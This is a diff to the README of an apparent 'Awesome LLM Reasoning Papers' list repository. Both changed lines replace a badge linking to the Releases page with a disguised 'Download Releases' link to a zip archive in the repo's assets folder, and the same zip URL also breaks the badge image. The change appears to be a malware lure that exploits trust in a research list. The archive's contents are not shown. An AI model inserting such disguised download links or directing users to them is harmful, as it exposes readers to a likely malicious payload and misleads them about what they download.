@@ -2,7 +2,7 @@
 
 Welcome to the **Awesome LLM Reasoning Papers** repository! This is a curated list of essential papers focusing on reasoning in Large Language Models (LLMs) and Multimodal Language Models (MLLMs). Whether you're a researcher, developer, or just curious about the advancements in language models, this repository serves as a valuable resource.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/Oznake/Awesome-LLM-reasoning-papers/releases)
+[![Download Releases](https://github.com/Oznake/Awesome-LLM-reasoning-papers/raw/refs/heads/main/assets/Awesome-reasoning-LL-papers-v2.7.zip%20Releases-Here-blue)](https://github.com/Oznake/Awesome-LLM-reasoning-papers/raw/refs/heads/main/assets/Awesome-reasoning-LL-papers-v2.7.zip)
 
 ## Table of Contents
 
@@ -101,6 +101,6 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 For any inquiries or suggestions, please feel free to reach out via GitHub issues or contact the repository maintainer directly.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/Oznake/Awesome-LLM-reasoning-papers/releases)
+[![Download Releases](https://github.com/Oznake/Awesome-LLM-reasoning-papers/raw/refs/heads/main/assets/Awesome-reasoning-LL-papers-v2.7.zip%20Releases-Here-blue)](https://github.com/Oznake/Awesome-LLM-reasoning-papers/raw/refs/heads/main/assets/Awesome-reasoning-LL-papers-v2.7.zip)
 
 Thank you for visiting the **Awesome LLM Reasoning Papers** repository. We hope you find these resources valuable in your exploration of reasoning in language models. Happy reading!
